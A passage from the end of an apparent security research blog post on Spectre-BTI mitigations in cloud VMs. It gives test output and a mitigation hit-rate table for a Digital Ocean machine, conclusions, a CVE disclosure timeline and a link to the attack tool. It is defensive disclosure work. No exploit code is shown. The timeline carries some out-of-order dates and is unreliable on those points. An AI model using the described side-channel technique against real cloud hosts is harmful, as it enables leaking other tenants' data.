+Rate: 1000/1000  MSR[72]=-1
+Total misspredict rate: 9998/10000 (99.98 %)
+</code></pre><h2 id=tests-on-digital-ocean>Tests on Digital Ocean</h2><p>The tested machines correctly enumerate the CPUs and allow MSR writes. We did observe a higher than expected hit rate with the IBPB usage. It is unexpected since, as we’ve stated in the beginning of the report, some hits were supposed to be seen due to the lack of synchronization, but what we saw was closer to 30% (versus &lt;1%). Given that IBPB does seem to be used, it might be something unrelated to the scope of this research so we’ve decided to report the observation versus investigating it further (notice that we had difficulties identifying the underlying hardware used as well).</p><pre tabindex=0><code>Kernel is Linux 5.19.0-23-generic #24-Ubuntu SMP PREEMPT_DYNAMIC Fri Oct 14 15:39:57 UTC 2022 x86_64
+CPU is DO-Premium-AMD
+
+Hardware check
+* Hardware support (CPU microcode) for mitigation techniques
+  * Indirect Branch Restricted Speculation (IBRS)
+    * SPEC_CTRL MSR is available:  YES 
+    * CPU indicates IBRS capability: NO 
+    * CPU indicates preferring IBRS always-on: NO 
+    * CPU indicates preferring IBRS over retpoline: NO 
+  * Indirect Branch Prediction Barrier (IBPB)
+    * CPU indicates IBPB capability:  YES (IBPB_SUPPORT feature bit)
+  * Single Thread Indirect Branch Predictors (STIBP)
+    * SPEC_CTRL MSR is available: YES 
+    * CPU indicates STIBP capability: YES (AMD STIBP feature bit)
+    * CPU indicates preferring STIBP always-on: NO 
+</code></pre><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>0.04 %</td><td>0.41 %</td><td>No</td></tr><tr><td>IBRS</td><td>0.05 %</td><td>0.38 %</td><td>No</td></tr><tr><td>STIBP</td><td>0.14 %</td><td>0.25 %</td><td>No</td></tr><tr><td>IBPB</td><td>29.39 %</td><td>18.88 %</td><td>No</td></tr><tr><td>PRCTL</td><td>0.02 %</td><td>0.02 %</td><td>No</td></tr></tbody></table><h2 id=conclusion>Conclusion</h2><p>The hardware mitigations for spectre-BTI provide different options for different scenarios. They also vary in performance impact and scope. Those mitigations are exposed to the applications via a kernel system call that abstracts some of the complexity (such as deciding if there are sibling threads or not on a system, if and which of the hardware mitigations are available and adequate, etc). Besides that, another level of abstraction is the hypervisor (which can expose or not the hardware features by filtering the cpuid output, or even control the MSR accesses and the understanding of sibling threads and cores). Each abstraction (hypervisor, kernel, hardware) has to properly work for the mitigation to be complete. Unfortunately, while the hardware interface is well documented, the kernel interface changes its default (like using IBRS versus STIBP/IBPB) and the hypervisor is dependent on the configuration (which is controlled by the different cloud providers, that DO NOT share their choices). That leads to a scenario in which the default configuration might be adequate for bare metal machines, but it is not (for different reasons) in the different cloud setups.</p><p>Given our research was not comprehensive (many different stances and offers were not tested) and the test method could be greatly improved, as well as some of the observed results could be more deeply analyzed, we are also sharing the raw data in the hopes to incentivize the community (and the security engineering teams of the companies) to look further.</p><h2 id=acknowledgements>Acknowledgements</h2><p>We would like to thank Alexandra Sandulescu for the excellent feedback, discussions and for reviewing/editing this write-up.</p><h2 id=tool--source-code>Tool & source code</h2><p>The tool and results for multiple instances can be found at <a href=https://github.com/es0j/hyperbleed>https://github.com/es0j/hyperbleed</a> .</p><h2 id=timeline>Timeline</h2><ul><li>December 01 2022 - Unexpected behavior on prctl detected</li><li>December 30 2022 - CVE 2023-0045 reported to kernel security team</li><li>January 01 2022 - CVE 2023-0045 fixed</li><li>December 23 2022 - First version of this writeup</li><li>December 26 2022 - Multiple tests performed on cloud providers</li><li>December 28 2022 - KVM behavior better understood, more cloud provider tests</li><li>December 31 2023 - Final write-up shared with AWS, Google, Oracle and Digital Ocean. No response until near the finish of 90 days embargo.</li><li>February 20 2023 - CVE 2023-1998 spectre v2 SMT mitigations problem reported to kernel security team</li><li>March 02 2023 - CVE 2023-0045 disclosed on google security research</li><li>March 30 2023 - CVE 2023-1998 fixed</li><li>April 12 2023 - CVE 2023-1998 disclosed on google security research</li><li>May 29 2023 - Hyperbleed report published</li></ul><h3 id=references>References:</h3><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p>“Exec ASLR: Abusing Intel Branch Predictors to bypass ASLR”. Link: <a href=https://github.com/es0j/ExecASLR-ekoparty>https://github.com/es0j/ExecASLR-ekoparty</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p>“Reverse Branch Target Buffer Poisoning”. Link: <a href=https://cos.ufrj.br/uploadfile/publicacao/3061.pdf>https://cos.ufrj.br/uploadfile/publicacao/3061.pdf</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p>&ldquo;RET2ASLR - Leaking ASLR from return instructions&rdquo; Link:<a href=https://github.com/google/security-research/tree/master/pocs/cpus/ret2aslr>https://github.com/google/security-research/tree/master/pocs/cpus/ret2aslr</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4><p>“Branch Target Injection". Link: <a href=https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/advisory-guidance/branch-target-injection.html>https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/advisory-guidance/branch-target-injection.html</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5><p>“The Linux kernel user-space API guide: Speculation Control”. Link: <a href=https://docs.kernel.org/userspace-api/spec_ctrl.html>https://docs.kernel.org/userspace-api/spec_ctrl.html</a>&#160;<a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a>&#160;<a href=#fnref1:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:6><p>&ldquo;Linux Source code&rdquo; Link: <a href=https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1970>https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1970</a>&#160;<a href=#fnref:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a>&#160;<a href=#fnref1:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:7><p>&ldquo;Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 4: Model-Specific Registers&rdquo; Link:<a href=https://www.intel.com/content/dam/develop/external/us/en/documents/335592-sdm-vol-4.pdf>https://www.intel.com/content/dam/develop/external/us/en/documents/335592-sdm-vol-4.pdf</a>&#160;<a href=#fnref:7 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:8><p>&ldquo;AMD64 Architecture Programmer’s Manual Volume 2:&rdquo; Link:<a href=https://www.amd.com/system/files/TechDocs/24593.pdf>https://www.amd.com/system/files/TechDocs/24593.pdf</a>&#160;<a href=#fnref:8 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:9><p>“Speculative Execution Side Channel Mitigations”. Link:<a href=https://www.intel.com/content/dam/develop/external/us/en/documents/336996-speculative-execution-side-channel-mitigations.pdf>https://www.intel.com/content/dam/develop/external/us/en/documents/336996-speculative-execution-side-channel-mitigations.pdf</a>&#160;<a href=#fnref:9 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:10><p>&ldquo;Speculative Execution Side Channel Mitigations&rdquo; Link: <a href=https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/speculative-execution-side-channel-mitigations.html>https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/speculative-execution-side-channel-mitigations.html</a>&#160;<a href=#fnref:10 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a>&#160;<a href=#fnref1:10 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a>&#160;<a href=#fnref2:10 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:11><p>“The Linux kernel user-space API guide: Speculation Control”. Link:<a href=https://www.kernel.org/doc/html/latest/userspace-api/spec_ctrl.html>https://www.kernel.org/doc/html/latest/userspace-api/spec_ctrl.html</a>&#160;<a href=#fnref:11 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:12><p>&ldquo;Linux Source code&rdquo; Link:<a href=https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1900>https://elixir.bootlin.com/linux/v5.15.65/source/arch/x86/kernel/cpu/bugs.c#L1900</a>&#160;<a href=#fnref:12 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:13><p>&ldquo;Seccomp&rdquo; Link:<a href=https://man7.org/linux/man-pages/man2/seccomp.2.html>https://man7.org/linux/man-pages/man2/seccomp.2.html</a>&#160;<a href=#fnref:13 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:14><p>&ldquo;Spectre Meltdown Checker&rdquo; Link:<a href=https://github.com/speed47/spectre-meltdown-checker>https://github.com/speed47/spectre-meltdown-checker</a>&#160;<a href=#fnref:14 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:15><p>“CVE 2023-0045 Bypassing Spectre-BTI User Space Mitigations”. Link:<a href=https://github.com/google/security-research/security/advisories/GHSA-9x5g-vmxf-4qj8>https://github.com/google/security-research/security/advisories/GHSA-9x5g-vmxf-4qj8</a>&#160;<a href=#fnref:15 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:16><p>“CVE 2023-1998 Spectre v2 SMT mitigations problem”. Link:<a href=https://github.com/google/security-research/security/advisories/GHSA-mj4w-6495-6crx>https://github.com/google/security-research/security/advisories/GHSA-mj4w-6495-6crx</a>&#160;<a href=#fnref:16 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div><footer class=post__footer><div class="post__tags tags clearfix"><svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M4 0h8s2 0 4 2l15 15s2 2 0 4L21 31s-2 2-4 0L2 16s-2-2-2-4V3s0-3 4-3m3 10a3 3 0 000-6 3 3 0 000 6"/></svg><ul class=tags__list><li class=tags__item><a class="tags__link btn" href=/en/tags/cpu/ rel=tag>cpu</a></li><li class=tags__item><a class="tags__link btn" href=/en/tags/spectre/ rel=tag>spectre</a></li><li class=tags__item><a class="tags__link btn" href=/en/tags/cloud/ rel=tag>cloud</a></li></ul></div></footer></article></main><nav class="pager flex"><div class="pager__item pager__item--next"><a class=pager__link href=/en/blog/2023-08-03-patching-games/ rel=next><span class=pager__subtitle>Next&#8201;»</span><p class=pager__title>Game Hacking: Using Dynamic Patching to Modify Games</p></a></div></nav></div></div><footer class=footer><div class="container footer__container flex"><div class=footer__copyright>&copy; 2024 GRIS Blog.
+<span class=footer__copyright-credits>Generated with <a href=https://gohugo.io/ rel="nofollow noopener" target=_blank>Hugo</a> and <a href=https://github.com/Vimux/Mainroad/ rel="nofollow noopener" target=_blank>Mainroad</a> theme.</span></div></div></footer></div><script async defer src=/js/menu.js></script><script type=text/x-mathjax-config>
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
+      processEscapes: true,
+      processEnvironments: true
+    }
+  });
+</script><script type=text/javascript async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>
